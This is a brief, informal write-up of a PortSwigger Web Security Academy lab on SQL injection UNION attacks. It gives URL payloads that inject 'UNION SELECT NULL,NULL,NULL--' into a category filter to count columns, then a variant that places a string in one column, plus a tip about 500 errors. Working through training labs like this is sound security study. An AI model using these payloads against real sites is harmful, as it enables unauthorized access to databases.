https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

Using the folowing URL `/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL--` now we know we have 3 columns

Enumerate the numbers of columns
and use the that query
`/filter?category='+UNION+SELECT+NULL,NULL,NULL--`

and then use the string provided by the lab
and use the that query
`/filter?category='+UNION+SELECT+NULL,'string',NULL--`
if it keeps giving you 500 error try to change the sring from a different orded